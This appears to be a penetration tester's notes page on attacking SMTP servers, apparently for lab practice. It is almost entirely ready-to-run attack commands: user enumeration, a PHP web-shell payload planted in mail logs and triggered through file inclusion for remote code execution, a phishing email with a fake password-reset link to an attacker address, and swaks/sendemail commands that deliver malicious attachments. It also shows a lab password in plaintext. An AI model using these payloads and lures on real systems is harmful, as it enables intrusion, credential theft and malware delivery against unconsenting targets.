https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp

### Initial checks

Banner grabbing:
```bash
nc -vn <IP> 25
```

Nmap enumeration:
```bash
nmap -p25 --script smtp* <IP>
```
>[!info] 
>Identify version and check for exploits using searchsploit
>- e.g. [[Bratarina]]

SMTP user enum: 
```
smtp-user-enum -M VRFY -U users.txt -t <IP>
```
>[!info]
>Example wordlist: `/opt/SecLists/Usernames/xato-net-10-million-usernames.txt`


### LFI -> Log poisoning to RCE

Connect to SMTP using telnet: [Guide](https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/)

Approach 1:
```bash
telnet <IP> 25

MAIL FROM:<gmail@gmail.com> 
RCPT TO:<?php system($_GET['c']); ?>
```

Approach 2:
```bash
telnet <IP> 25

MAIL FROM: <raj>
RCPT TO: Helios
data
<?php system($_GET['c']); ?>
```

Now use LFI on the webpage:
```bash
http://<URL>/<PAGE>.php?file=/var/log/mail&c=id
```


### Send email 

Manual approach:
```bash
telnet 192.168.234.137 25
Trying 192.168.234.137...
Connected to 192.168.234.137.
Escape character is '^]'.
220 postfish.off ESMTP Postfix (Ubuntu)
HELO postfish.off
250 postfish.off
MAIL FROM:it@postfish.off
250 2.1.0 Ok
RCPT TO:brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Reset your password
Use the following link: http://192.168.45.161/
.
250 2.0.0 Ok: queued as C33E945441
```

With attachment for client side attack
```bash
# Sendemail:
sendemail -t <to> -f <from> -s <IP> -u "<pwned>" -a <file> -xu <user> -xp '<pass>' -m "toto" -VV

# Swaks:
sudo swaks -t <user@domain> --from <user@domain> --attach @config.Library-ms --server <IP> --body @body.txt --header "Subject: <pwned>" --suppress-data -ap

# Alt
swaks -t "mailadmin@localhost" -f "jonas@localhost" --header "Subject: Sheet" --body "Here you go" --attach @file.ods --protocol SMTP --server <IP>
```

Example:
```bash
# Sendemail:
sendemail -t marcus@beyond.com -f john@beyond.com -s 192.168.129.242 -u "Please Update" -a /home/kali/PG/Challenge_Labs/BEYOND/MAILSRV1/config.Library-ms -xu john -xp 'dqsTwTpZPn#nL' -m "toto" -VV

# Swaks:
sudo swaks -t f.miller@skylark.com --from s.ahmed@skylark.com --attach @runme.xls --server 10.10.155.13 --body @body.txt --header "Check it" --suppress-data -ap
```
